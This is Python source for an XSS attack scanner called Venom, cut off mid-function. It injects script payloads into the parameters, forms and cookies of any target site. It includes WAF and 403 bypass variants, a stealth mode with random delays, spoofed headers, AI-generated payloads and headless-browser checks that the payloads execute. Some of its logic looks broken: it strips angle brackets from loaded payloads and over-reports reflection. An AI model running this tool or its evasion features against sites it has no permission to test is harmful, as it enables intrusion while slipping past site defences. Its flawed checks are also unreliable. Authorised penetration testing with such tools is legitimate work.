#!/usr/bin/env python3
import requests
import sys
import re
import os
import time
import argparse
import threading
import queue
import random
import tempfile
from urllib.parse import urljoin, urlencode, urlparse, parse_qs
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import logging
from typing import Optional, List, Dict
import html
from requests.exceptions import RequestException
from concurrent.futures import ThreadPoolExecutor
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics.pairwise import cosine_similarity
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoAlertPresentException, WebDriverException, TimeoutException

# Setup logging
log_file = "venom.log"
logging.basicConfig(
    level=logging.DEBUG if '--verbose' in sys.argv else logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(log_file, mode='a', encoding='utf-8'), logging.StreamHandler()]
)
logging.info("Logging initialized successfully")

# Colors
RED, GREEN, YELLOW, RESET, BOLD, WHITE = '\033[91m', '\033[92m', '\033[93m', '\033[0m', '\033[1m', '\033[97m'
ORANGE, BLUE, PURPLE, CYAN = '\033[38;5;208m', '\033[94m', '\033[95m', '\033[96m'

class ThreadSafeCounter:
    def __init__(self):
        self.value = 0
        self.lock = threading.Lock()

    def increment(self):
        with self.lock:
            self.value += 1
            return self.value

    def get(self):
        with self.lock:
            return self.value

def sanitize_input(input_str: str) -> str:
    return re.sub(r'[;&|><`]', '', input_str)

def sanitize_path(path: str) -> str:
    return os.path.abspath(os.path.normpath(path))

def parse_post_file(file_path: str) -> tuple[Optional[str], Dict[str, str], Dict[str, str]]:
    url = None
    headers = {}
    data = {}
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read().strip()
            lines = content.splitlines()
            if lines and lines[0].startswith("POST "):
                url_parts = lines[0].split()
                if len(url_parts) >= 2:
                    url = url_parts[1]
            in_headers = True
            body_start = 0
            for i, line in enumerate(lines[1:], 1):
                if not line.strip():
                    in_headers = False
                    body_start = i + 1
                    break
                if in_headers and ':' in line:
                    key, value = line.split(':', 1)
                    headers[sanitize_input(key.strip())] = sanitize_input(value.strip())
            if not url and 'Host' in headers:
                url = f"http://{headers['Host']}{url or '/'}"
            if body_start > 0 and body_start < len(lines):
                body = '&'.join(lines[body_start:]).strip()
                for pair in body.split('&'):
                    if '=' in pair:
                        key, value = pair.split('=', 1)
                        data[sanitize_input(key)] = sanitize_input(value)
            logging.info(f"Parsed POST file: URL={url}, Headers={headers}, Data={data}")
            return url, headers, data
    except Exception as e:
        logging.error(f"Failed to parse POST file {file_path}: {e}")
        return None, {}, {}
    return url, headers, data

def get_banner_and_features() -> str:
    banner = f"""
{BLUE}╔════════════════════════════════════════════════════════════════════╗{RESET}
{BLUE}║{RESET}          {CYAN}██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}          {CYAN}██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}          {CYAN}██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}          {CYAN}██║   ██║██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}          {CYAN}╚██████╔╝███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}           {CYAN}╚═════╝ ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}                                                                    {BLUE}║{RESET}
{BLUE}║{RESET}                  {PURPLE}Venom Advanced XSS Scanner 2025{RESET}                   {BLUE}║{RESET}
{BLUE}║{RESET}                            {WHITE}Version 5.37{RESET}                            {BLUE}║{RESET}
{BLUE}║{RESET}    {GREEN}Made by: YANIV AVISROR | PENETRATION TESTER | ETHICAL HACKER{RESET}    {BLUE}║{RESET}
{BLUE}╚════════════════════════════════════════════════════════════════════╝{RESET}
"""
    features = [
        "Optimized XSS detection with refined similarity and execution checks",
        "Parallel GET/POST testing across all parameters",
        "Custom POST parsing from files",
        "Dynamic response analysis with automatic execution verification",
        "Advanced WAF/IPS detection with bypass options",
        "Payloads from local, GitHub, or custom sources",
        "AI-driven payload optimization (local or external)",
        "Headless browser verification for executable XSS",
        "Real-time progress with method and parameter tracking",
        "Flexible session handling with cookie support",
        "Detailed reporting with severity and context"
    ]
    return banner + "\n".join(f"{GREEN}{BOLD}●{RESET} {BOLD}{feature}{RESET}" for feature in features) + "\n"

def parse_args() -> argparse.Namespace:
    banner_and_features = get_banner_and_features()
    description = f"""{banner_and_features}
Venom Advanced XSS Scanner is a professional tool for ethical penetration testers to detect XSS vulnerabilities with high accuracy. Version 5.37 enhances detection by lowering similarity thresholds, auto-verifying execution, and ensuring all parameters are tested.

Usage:
  python3 venom.py <url> [options]

Examples:
  python3 venom.py http://example.com --scan-xss --verbose --full-report -w 5 --timeout 30
    - Basic scan with verbose output and 5 workers.
  python3 venom.py https://test.com --scan-xss --method both --data "user=test&pass=test" --payloads-dir "/path/to/payloads" --verbose --new-session --verify-execution
    - Tests GET/POST with custom data, new session, and execution verification.
  python3 venom.py http://site.com --scan-xss --post-file post.txt --login-url http://site.com/login --login-data "username=admin&password=pass123" -H "Cookie: session=abc123" --ai-assist
    - Uses POST file, logs in, keeps session cookie, with AI assistance.
  python3 venom.py https://vuln.com --scan-xss --stealth --use-403-bypass --payloads-dir "/usr/local/bin/payloads" --timeout 60 --full-report
    - Stealth mode with 403 bypass, extended timeout.
"""
    
    parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("url", help="Target URL to scan (e.g., http://example.com).")
    parser.add_argument("-w", "--workers", type=int, default=5, help="Number of concurrent threads (default: 5, max: 20).")
    parser.add_argument("--ai-assist", action="store_true", help="Enable AI-driven payload optimization (local by default).")
    parser.add_argument("--ai-key", type=str, help="API key for external AI platform (e.g., xAI, OpenAI).")
    parser.add_argument("--ai-platform", type=str, choices=['xai-grok', 'openai-gpt3', 'google-gemini'],
                        help="External AI platform (requires --ai-key).")
    parser.add_argument("--scan-xss", action="store_true", help="Enable XSS scanning (required).", required=True)
    parser.add_argument("--payloads-dir", default="./payloads/", help="Directory with custom payload files.")
    parser.add_argument("--timeout", type=int, default=30, help="HTTP request timeout in seconds (default: 30).")
    parser.add_argument("--verbose", action="store_true", help="Enable detailed logging to venom.log and console.")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode: 2 workers, 5-15s delays.")
    parser.add_argument("--min-delay", type=float, help="Min delay between requests (default: 0.1 or 5 in stealth).")
    parser.add_argument("--max-delay", type=float, help="Max delay between requests (default: 0.5 or 15 in stealth).")
    parser.add_argument("--full-report", action="store_true", help="Show all vulnerabilities in final report.")
    parser.add_argument("-H", "--headers", action='append', default=[], help="Custom headers (e.g., 'Cookie: session=abc123').")
    parser.add_argument("--method", choices=['get', 'post', 'both'], default='both', help="HTTP method to test (default: both).")
    parser.add_argument("--data", type=str, help="POST data (e.g., 'key1=value1&key2=value2').")
    parser.add_argument("--post-file", type=str, help="TXT file with POST request (SQLmap format).")
    parser.add_argument("--payload-field", type=str, help="Specific field to inject payloads (e.g., 'email').")
    parser.add_argument("--login-url", type=str, help="Login URL for session authentication.")
    parser.add_argument("--login-data", type=str, help="Login credentials (e.g., 'username=admin&password=pass123').")
    parser.add_argument("--verify-execution", action="store_true", help="Verify executable XSS with headless browser (auto-enabled for on* payloads).")
    parser.add_argument("--force-headless", action="store_true", help="Force headless browser for all payloads.")
    parser.add_argument("--new-session", action="store_true", help="Start a new session, clearing cookies and prior data.")
    parser.add_argument("--use-403-bypass", action="store_true", help="Enable 403 bypass with specialized payloads.")

    print(banner_and_features)
    while True:
        response = input(f"{RED}[!] Ethical use only (YES/NO): {RESET}").strip().upper()
        if response == "YES":
            print(f"{GREEN}[+] Ethical use confirmed. Initiating scan...{RESET}")
            break
        elif response == "NO":
            print(f"{RED}[!] This tool is for ethical use only. Exiting.{RESET}")
            sys.exit(0)
        else:
            print(f"{YELLOW}[!] Please enter YES or NO.{RESET}")

    args = parser.parse_args()
    args.payloads_dir = sanitize_path(args.payloads_dir)
    args.workers = min(args.workers, 20)
    if args.stealth:
        args.workers = min(args.workers, 2)
        args.min_delay = args.min_delay if args.min_delay is not None else 5
        args.max_delay = args.max_delay if args.max_delay is not None else 15
        print(f"{GREEN}[+] Stealth mode: Workers {args.workers}, Delays {args.min_delay}-{args.max_delay}s{RESET}")
    else:
        args.min_delay = args.min_delay if args.min_delay is not None else 0.1
        args.max_delay = args.max_delay if args.max_delay is not None else 0.5
    
    if args.post_file:
        post_url, post_headers, post_data = parse_post_file(sanitize_path(args.post_file))
        if post_url and not args.url:
            args.url = post_url
        if not args.url:
            print(f"{RED}[!] No URL provided. Exiting.{RESET}")
            sys.exit(1)
        args.post_headers = post_headers
        args.post_data = post_data if not args.data else dict(pair.split('=', 1) for pair in args.data.split('&'))
        if post_headers:
            args.headers.extend([f"{k}: {v}" for k, v in post_headers.items()])
        print(f"{GREEN}[+] Loaded POST request from {args.post_file}{RESET}")
    
    if args.ai_platform and not args.ai_key:
        print(f"{RED}[!] --ai-platform requires --ai-key. Exiting.{RESET}")
        sys.exit(1)
    if args.login_url and not args.login_data:
        print(f"{RED}[!] --login-url requires --login-data. Exiting.{RESET}")
        sys.exit(1)
    
    command = " ".join(sys.argv)
    print(f"{GREEN}[+] Command: {command}{RESET}")
    return args

def fetch_payloads_from_github(timeout: int) -> List[str]:
    payloads = []
    headers = {'User-Agent': 'Venom-XSS-Scanner/5.37'}
    session = requests.Session()
    session.mount('https://', HTTPAdapter(max_retries=Retry(total=5, backoff_factor=2)))
    github_urls = [
        "https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt",
    ]
    for url in github_urls:
        try:
            response = session.get(url, headers=headers, timeout=timeout, verify=True)
            response.raise_for_status()
            payloads.extend([sanitize_input(p.strip()) for p in response.text.splitlines() if p.strip() and '<' in p])
            logging.info(f"Fetched {len(payloads)} payloads from {url}")
            break
        except RequestException as e:
            logging.error(f"Failed to fetch payloads from {url}: {e}")
    return payloads

class PayloadGenerator:
    def __init__(self, payloads_dir: str, bypass_needed: bool = False, use_403_bypass: bool = False, stealth: bool = False):
        self.payloads_dir = payloads_dir
        self.bypass_needed = bypass_needed
        self.use_403_bypass = use_403_bypass
        self.stealth = stealth
        self.payloads = self.load_payloads()
        self.previous_success = []

    def load_payloads(self) -> List[str]:
        default_payloads = [
            "<script>alert('venom')</script>",
            "<img src=x onerror=alert('venom')>",
            "<svg onload=alert('venom')>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<input onfocus=alert(1) autofocus>",
            "<div onmouseover=alert(1)>test</div>",
            "autofocus/onfocus=\"confirm(document.domain)\""
        ]
        stealth_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
        ]
        
        payloads = []
        if not os.path.exists(self.payloads_dir):
            logging.warning(f"Payloads dir {self.payloads_dir} not found; using defaults.")
            return stealth_payloads if self.stealth else default_payloads

        category_map = {
            'waf_bypass': 'waf_bypass.txt',
            '403bypass': '403bypass.txt',
            'default': ['advanced_xss.txt', 'xss_payloads.txt', 'basic_xss.txt']
        }

        selected_category = 'waf_bypass' if self.bypass_needed else '403bypass' if self.use_403_bypass else 'default'
        all_files = [f for f in os.listdir(self.payloads_dir) if f.endswith('.txt')]
        if not all_files:
            logging.warning(f"No .txt files found in {self.payloads_dir}; using defaults.")
            return stealth_payloads if self.stealth else default_payloads

        if selected_category == 'default':
            for filename in category_map['default']:
                file_path = os.path.join(self.payloads_dir, filename)
                if os.path.exists(file_path):
                    with open(file_path, 'r', encoding='utf-8') as f:
                        payloads.extend(sanitize_input(line.strip()) for line in f if line.strip())
                    logging.info(f"Loaded payloads from {file_path}: {len(payloads)} payloads")
        else:
            file_path = os.path.join(self.payloads_dir, category_map[selected_category])
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    payloads.extend(sanitize_input(line.strip()) for line in f if line.strip())
                logging.info(f"Loaded {selected_category} payloads from {file_path}: {len(payloads)} payloads")
            else:
                logging.warning(f"{selected_category} file {file_path} not found; falling back to defaults.")
                payloads = default_payloads

        if not self.stealth and not self.use_403_bypass:
            payloads.extend(fetch_payloads_from_github(15))
        
        unique_payloads = list(set(payloads))
        logging.debug(f"Total unique payloads loaded: {len(unique_payloads)}")
        return unique_payloads if unique_payloads else (stealth_payloads if self.stealth else default_payloads)

    def optimize_payloads(self, response_text: str, active_params: List[str]) -> List[str]:
        html_context = '<input' in response_text or '<form' in response_text
        js_context = '<script' in response_text or 'javascript:' in response_text
        optimized = []
        for payload in self.payloads:
            if any(success in payload for success in self.previous_success):
                optimized.append(payload)
            elif html_context and ('on' in payload.lower() or 'src=' in payload.lower() or 'autofocus' in payload.lower()):
                optimized.append(payload)
            elif js_context and ('alert(' in payload.lower() or 'javascript:' in payload.lower() or 'confirm(' in payload.lower()):
                optimized.append(payload)
            elif 'alert(' in payload.lower() or 'confirm(' in payload.lower():
                optimized.append(payload)
        return optimized if optimized else self.payloads

    def generate_waf_bypass_payloads(self, base_payload: str) -> List[str]:
        return [
            base_payload.upper(),
            base_payload.replace('<', '%3C').replace('>', '%3E'),
            f"{base_payload[:5]}/*comment*/{base_payload[5:]}",
            base_payload.replace('alert', 'a\u006cert')
        ]

    def generate_403_bypass_payloads(self, base_payload: str) -> List[str]:
        return [
            f"//{base_payload}",
            f"/*/{base_payload}/*/",
            base_payload.replace(' ', '%20'),
            f"{base_payload};",
        ]

    def generate(self) -> List[str]:
        return self.payloads

    def update_success(self, payload: str):
        self.previous_success.append(payload)

class AIAssistant:
    def __init__(self, payloads: List[str], api_key: Optional[str] = None, platform: Optional[str] = None):
        self.payloads = payloads
        self.api_key = api_key
        self.platform = platform
        self.api_endpoint = self.get_api_endpoint() if platform else None
        self.success_history: Dict[str, dict] = {}
        self.lock = threading.Lock()
        if self.api_key and self.api_endpoint:
            logging.info(f"AI assistance enabled with external platform: {platform}, endpoint: {self.api_endpoint}")
        else:
            logging.info("AI assistance enabled with local learning (no external API)")

    def get_api_endpoint(self) -> str:
        endpoints = {
            "xai-grok": "https://api.xai.com/v1/completions",
            "openai-gpt3": "https://api.openai.com/v1/completions",
            "google-gemini": "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent"
        }
        return endpoints.get(self.platform, "https://api.xai.com/v1/completions")

    def suggest_payloads(self, response: Optional[str] = None, initial_run: bool = False, status_code: int = 200) -> List[str]:
        executable_payloads = [p for p in self.payloads if 'alert(' in p.lower() or 'on' in p.lower() or 'confirm(' in p.lower()]
        other_payloads = [p for p in self.payloads if p not in executable_payloads]
        
        if status_code == 404 or "timed out" in str(response).lower():
            executable_payloads = sorted(executable_payloads, key=len)[:10]
        
        if self.api_key and self.api_endpoint and response:
            ai_suggestions = self.get_ai_suggestions(response)
            executable_payloads.extend(ai_suggestions)
            logging.info(f"External AI suggested {len(ai_suggestions)} payloads: {ai_suggestions[:5]}...")
        elif response:
            with self.lock:
                sorted_payloads = sorted(
                    executable_payloads,
                    key=lambda p: self.success_history.get(p, {"weight": 0.0})["weight"],
                    reverse=True
                )
            html_context = '<input' in response or '<form' in response
            js_context = '<script' in response or 'javascript:' in response
            optimized = [p for p in sorted_payloads if (html_context and 'on' in p.lower()) or (js_context and ('alert(' in p.lower() or 'confirm(' in p.lower()))]
            executable_payloads = optimized if optimized else sorted_payloads[:20]
            logging.info(f"Local AI optimized {len(executable_payloads)} payloads: {executable_payloads[:5]}...")
        
        return list(set(executable_payloads + other_payloads[:20]))

    def get_ai_suggestions(self, response: str) -> List[str]:
        try:
            headers = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
            if self.platform == "google-gemini":
                data = {
                    "contents": [{"parts": [{"text": f"Suggest optimized XSS payloads for this response:\n{response[:500]}"}]}],
                    "generationConfig": {"maxOutputTokens": 50}
                }
            else:
                data = {
                    "prompt": f"Suggest optimized XSS payloads for this web response:\n{response[:500]}",
                    "max_tokens": 50,
                    "model": "grok" if self.platform == "xai-grok" else "text-davinci-003"
                }
            ai_response = requests.post(self.api_endpoint, json=data, headers=headers, timeout=10, verify=True)
            ai_response.raise_for_status()
            if self.platform == "google-gemini":
                suggestions = ai_response.json().get("candidates", [{}])[0].get("content", {}).get("parts", [{}])[0].get("text", "").splitlines()
            else:
                suggestions = ai_response.json().get("choices", [{}])[0].get("text", "").splitlines()
            return [sanitize_input(s.strip()) for s in suggestions if s.strip() and '<' in s]
        except RequestException as e:
            logging.error(f"AI API call failed for {self.platform}: {e}")
            return []

    def record_success(self, payload: str, context: str = "unknown", status_code: int = 200) -> None:
        with self.lock:
            if payload not in self.success_history:
                self.success_history[payload] = {"success_count": 0, "weight": 0.0, "context": context}
            if status_code == 200:
                self.success_history[payload]["success_count"] += 1
                self.success_history[payload]["weight"] = min(1.0, self.success_history[payload]["weight"] + 0.2)

class Venom:
    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.session = requests.Session()
        self.session.mount('http://', HTTPAdapter(max_retries=Retry(total=5, backoff_factor=2), pool_maxsize=200))
        self.session.mount('https://', HTTPAdapter(max_retries=Retry(total=5, backoff_factor=2), pool_maxsize=200))
        self.session.headers.update({
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15'
            ]),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.google.com/'
        })

        self.update_headers(args.headers)
        self.post_data = args.post_data if hasattr(args, 'post_data') else {'test': 'default'}  # Default POST data
        if args.data:
            self.post_data.update(dict(pair.split('=', 1) for pair in args.data.split('&')))

        if args.new_session:
            self.session.cookies.clear()
            self.vulnerabilities = []
            self.visited_urls = set()
            logging.info("New session created by clearing cookies and prior data")
        elif args.login_url and args.login_data:
            self.establish_session(args.login_url, args.login_data)

        self.task_queue = queue.Queue()
        self.lock = threading.Lock()
        self.vulnerabilities = [] if not hasattr(self, 'vulnerabilities') else self.vulnerabilities
        self.visited_urls = set() if not hasattr(self, 'visited_urls') else self.visited_urls
        self.total_tests = ThreadSafeCounter()
        self.total_payloads = 0
        self.current_payload = "Initializing..."
        self.current_param = "None"
        self.current_method = "None"
        self.current_cookie = "None"
        self.start_time = time.time()
        self.running = True
        self.domain = urlparse(args.url).netloc
        self.waf_ips_status = "Unknown"
        self.bypass_performed = False
        self.use_403_bypass = args.use_403_bypass
        self.is_waf_detected = False
        self.active_params = []

        self.initial_waf_ips_check()
        self.payload_generator = PayloadGenerator(self.args.payloads_dir, self.bypass_performed, self.use_403_bypass, self.args.stealth)
        self.payloads = self.payload_generator.generate()
        self.total_payloads = len(self.payloads)
        self.ai_assistant = AIAssistant(self.payloads, self.args.ai_key, self.args.ai_platform) if self.args.ai_assist else None
        print(f"{GREEN}[+] AI Assistance: {'Enabled (Local)' if self.ai_assistant and not self.args.ai_key else 'Enabled (External)' if self.ai_assistant else 'Disabled'}{RESET}")
        if self.use_403_bypass:
            print(f"{GREEN}[+] 403 Bypass Enabled{RESET}")

    def update_headers(self, headers: List[str]) -> None:
        if not headers:
            return
        for header in headers:
            try:
                key, value = header.split(':', 1)
                sanitized_key = sanitize_input(key.strip())
                sanitized_value = sanitize_input(value.strip())
                self.session.headers.update({sanitized_key: sanitized_value})
                if sanitized_key.lower() == 'cookie':
                    logging.info(f"Custom Cookie added: {sanitized_value}")
                else:
                    logging.info(f"Custom Header added: {sanitized_key}: {sanitized_value}")
            except ValueError:
                logging.warning(f"Invalid header format: {header}. Expected 'Key: Value'.")

    def establish_session(self, login_url: str, login_data: str) -> bool:
        login_dict = dict(pair.split('=', 1) for pair in login_data.split('&'))
        try:
            response = self.session.post(login_url, data=login_dict, timeout=self.args.timeout, verify=True)
            if response.status_code in [200, 302]:
                logging.info(f"Login successful to {login_url}. Cookies: {dict(self.session.cookies)}")
                return True
            logging.warning(f"Login failed: Status {response.status_code}")
            return False
        except RequestException as e:
            logging.error(f"Login failed: {e}")
            return False

    def initial_waf_ips_check(self) -> None:
        try:
            test_payload = "<script>alert('waf_test')</script>"
            response = self.session.get(self.args.url + "?test=" + test_payload, timeout=self.args.timeout, verify=True)
            headers = response.headers
            waf_indicators = {
                'cloudflare': 'cf-ray',
                'akamai': 'akamai',
                'sucuri': 'sucuri',
                'mod_security': 'mod_security',
                'captcha': 'captcha'
            }
            for tech, indicator in waf_indicators.items():
                if indicator.lower() in str(headers).lower() or tech.lower() in response.text.lower():
                    self.waf_ips_status = f"WAF detected ({tech})"
                    self.is_waf_detected = True
                    break
            if 'blocked' in response.text.lower() or response.status_code == 403 or 'captcha' in response.text.lower():
                self.waf_ips_status = "WAF detected (behavioral/captcha)"
                self.is_waf_detected = True
            if not self.is_waf_detected and headers.get('Content-Security-Policy'):
                self.waf_ips_status = "IPS detected (CSP present)"
                self.is_waf_detected = True
            if not self.is_waf_detected:
                self.waf_ips_status = "No WAF/IPS detected"
            logging.info(f"WAF/IPS check result: {self.waf_ips_status}")
        except RequestException as e:
            self.waf_ips_status = "Check failed"
            logging.error(f"WAF/IPS check failed: {e}")

    def check_connection(self, url: str) -> bool:
        try:
            response = self.session.get(url, timeout=self.args.timeout, verify=True)
            return response.status_code < 400 or response.status_code in [403, 404]
        except RequestException:
            return False

    def identify_active_params(self, url: str, soup: BeautifulSoup, method: str) -> List[str]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        param_keys = list(params.keys())
        additional_params = ['q', 'search', 'query', 'id', 'page', 'email']
        for param in additional_params:
            if param not in param_keys:
                param_keys.append(param)
        for tag in soup.find_all(['input', 'textarea', 'select']):
            name = tag.get('name') or tag.get('id')
            if name and name not in param_keys:
                param_keys.append(name)
        if method == 'post' and self.post_data:
            param_keys.extend(self.post_data.keys())
        return param_keys

    def extract_cookies(self) -> Dict[str, str]:
        cookies = dict(self.session.cookies)
        if 'Cookie' in self.session.headers:
            for cookie in self.session.headers['Cookie'].split(';'):
                if '=' in cookie:
                    key, value = cookie.split('=', 1)
                    cookies[sanitize_input(key.strip())] = sanitize_input(value.strip())
        return cookies

    def verify_execution(self, url: str, payload: str) -> bool:
        options = Options()
        options.headless = True
        options.add_argument(f"--user-data-dir={tempfile.mkdtemp()}")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        driver = None
        try:
            driver = webdriver.Chrome(options=options)
            driver.set_page_load_timeout(30)
            driver.get(url)
            try:
                alert = driver.switch_to.alert
                alert.accept()
                logging.info(f"Execution verified for {url} (Alert detected)")
                return True
            except NoAlertPresentException:
                driver.execute_script("window.confirm = function(msg) { return true; }; window.alert = function(msg) { return true; };")
                driver.get(url)
                if 'alert(' in driver.page_source.lower() or 'confirm(' in driver.page_source.lower():
                    logging.info(f"Execution verified for {url} (Alert/Confirm in source)")
                    return True
                logging.debug(f"No alert/confirm executed for {url}")
                return False
        except (WebDriverException, TimeoutException) as e:
            logging.error(f"Headless verification failed: {e}")
            return False
        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass

    def scan(self) -> None:
        logging.info(f"Starting scan on {self.args.url}")
        print(f"{GREEN}[+] Initiating XSS Scan on {CYAN}{self.args.url}{RESET}")
        if not self.check_connection(self.args.url):
            print(f"{RED}[!] URL not suitable. Aborting.{RESET}")
            self.report()
            return
    
        specific_payload = "autofocus/onfocus=\"confirm(document.domain)\""
        if 'email' in urlparse(self.args.url).query or self.args.payload_field == 'email':
            self.test_request(self.args.url.split('?')[0], {'email': specific_payload}, specific_payload, 'get', "Query String (email)", "")
            if self.args.method in ['post', 'both']:
                self.test_request(self.args.url.split('?')[0], {'email': specific_payload}, specific_payload, 'post', "Form Field (email)", "")
    
        if self.session.cookies:
            logging.info("Testing with existing session cookies")
            self.crawl(self.args.url, session_mode="existing")
    
        original_cookies = self.session.cookies.copy()
        self.session.cookies.clear()
        logging.info("Testing with new session (no cookies)")
        self.crawl(self.args.url, session_mode="new")
        self.session.cookies.update(original_cookies)
    
        with ThreadPoolExecutor(max_workers=self.args.workers) as executor:
            futures = []
            while not self.task_queue.empty() and self.running:
                try:
                    task = self.task_queue.get(timeout=15)
                    futures.append(executor.submit(task))
                except queue.Empty:
                    break
        
            for future in futures:
                try:
                    response = future.result()
                    if response and response.status_code == 429:
                        self.args.workers = max(1, self.args.workers - 1)
                        executor._max_workers = self.args.workers
                        print(f"{YELLOW}[!] Rate limit detected, workers reduced to {self.args.workers}{RESET}")
                    delay = random.uniform(self.args.min_delay, self.args.max_delay)
                    time.sleep(delay)
                except Exception as e:
                    logging.error(f"Thread failed: {e}")
    
        self.running = False
        self._display_status(final=True)
        self.report()

    def crawl(self, url: str, depth: int = 0, max_depth: int = 3, session_mode: str = "existing") -> None:
        with self.lock:
            if url in self.visited_urls or depth > max_depth or urlparse(url).netloc != self.domain:
                return
            self.visited_urls.add(url)
        try:
            response = self.session.get(url, timeout=self.args.timeout, verify=True)
            soup = BeautifulSoup(response.text, 'html.parser')
            payloads = self.payload_generator.optimize_payloads(response.text, self.active_params)
            if self.ai_assistant:
                payloads = self.ai_assistant.suggest_payloads(response.text, initial_run=(depth == 0), status_code=response.status_code)
            
            if self.args.method in ['get', 'both']:
                self.test_injection_points(url, response, soup, payloads, 'get')
            if self.args.method in ['post', 'both']:
                self.test_injection_points(url, response, soup, payloads, 'post')
            self.test_cookies(url, payloads, response.text)
            
            for form in soup.find_all('form'):
                action = urljoin(url, form.get('action', ''))
                if urlparse(action).netloc == self.domain:
                    self.task_queue.put(lambda f=form, a=action, p=payloads: self.test_form(a, f, p))
        except RequestException as e:
            logging.error(f"Crawl failed for {url}: {e}")

    def test_injection_points(self, url: str, response: requests.Response, soup: BeautifulSoup, payloads: List[str], method: str) -> None:
        active_params = self.identify_active_params(url, soup, method)
        logging.info(f"Testing {method.upper()} with params: {active_params} on {url}")
        base_url = url.split('?', 1)[0]
        base_response = response.text
        
        with ThreadPoolExecutor(max_workers=min(self.args.workers, len(active_params))) as executor:
            futures = []
            for param in active_params:
                for payload in payloads:
                    self.current_param = param
                    self.current_method = method.upper()
                    futures.append(executor.submit(self.test_request, base_url, {param: payload}, payload, method, f"{'Query String' if method == 'get' else 'Form Field'} ({param})", base_response))
            for future in futures:
                future.result()

    def test_form(self, action: str, form: BeautifulSoup, payloads: List[str]) -> None:
        inputs = {inp.get('name'): inp.get('value', '') for inp in form.find_all(['input', 'textarea', 'select']) if inp.get('name')}
        if not inputs:
            inputs = {tag.get('id') or f"unnamed_{i}": '' for i, tag in enumerate(form.find_all(['input', 'textarea', 'select']))}
        if self.post_data:
            inputs.update(self.post_data)
        try:
            base_response = self.session.post(action, data=inputs, timeout=self.args.timeout, verify=True).text
            logging.info(f"Base POST request to {action} with data: {inputs}")
        except RequestException:
            base_response = ""
        
        with ThreadPoolExecutor(max_workers=min(self.args.workers, len(inputs))) as executor:
            futures = []
            for name in inputs:
                for payload in payloads:
                    self.current_param = name
                    self.current_method = "POST"
                    test_params = inputs.copy()
                    test_params[name] = payload
                    futures.append(executor.submit(self.test_request, action, test_params, payload, 'post', f"Form Field ({name})", base_response))
            for future in futures:
                future.result()

    def test_cookies(self, url: str, payloads: List[str], base_response: str) -> None:
        cookies = self.extract_cookies()
        if not cookies:
            return
        logging.info(f"Testing cookies: {list(cookies.keys())} on {url}")
        original_headers = self.session.headers.copy()
        for cookie_name, cookie_value in cookies.items():
            for payload in payloads:
                self.current_param = f"Cookie: {cookie_name}"
                self.current_cookie = f"{cookie_name}={payload}"
                self.current_method = "GET"
                cookie_str = '; '.join([f"{k}={v if k != cookie_name else payload}" for k, v in cookies.items()])
                self.session.headers['Cookie'] = cookie_str
                self.test_request(url, {}, payload, 'get', f"Cookie ({cookie_name})", base_response)
        self.session.headers = original_headers

    def test_request(self, url: str, params: dict, payload: str, method: str, injection_point: str, 
                    base_response: str) -> Optional[requests.Response]:
        retry_attempts = 3
        for attempt in range(retry_attempts):
            try:
                self.total_tests.increment()
                self.current_payload = payload
                self._display_status()
                data = self.post_data.copy() if method == 'post' else None
                if method == 'post':
                    data.update(params)
                resp = self.session.request(
                    method, url,
                    params=params if method == 'get' else None,
                    data=data if method == 'post' else None,
                    timeout=self.args.timeout,
                    verify=True
                )
                response_text = html.unescape(resp.text.lower())
                
                if resp.status_code == 403 and self.use_403_bypass:
                    logging.info(f"403 detected for {url}, attempting bypass with payload: {payload}")
                    bypass_payloads = self.payload_generator.generate_403_bypass_payloads(payload)
                    for bypass_payload in bypass_payloads:
                        self.current_payload = bypass_payload
                        resp = self.session.request(
                            method, url,
                            params={list(params.keys())[0]: bypass_payload} if method == 'get' else None,
                            data={list(params.keys())[0]: bypass_payload} if method == 'post' else None,
                            timeout=self.args.timeout,
                            verify=True
                        )
                        response_text = html.unescape(resp.text.lower())
                        if resp.status_code != 403:
                            logging.info(f"403 bypass successful with payload: {bypass_payload}")
                            self.bypass_performed = True
                            break
                
                reflected = payload.lower() in response_text or \
                            any(part.lower() in response_text for part in payload.split()) or \
                            any(tag in response_text for tag in ['<script', '<img', '<svg', 'onerror', 'onload'])
                if reflected:
                    logging.debug(f"Payload reflected: {payload} in {response_text[:200]}...")
                    print(f"{YELLOW}[!] Reflected Payload: {payload}{RESET}")
                else:
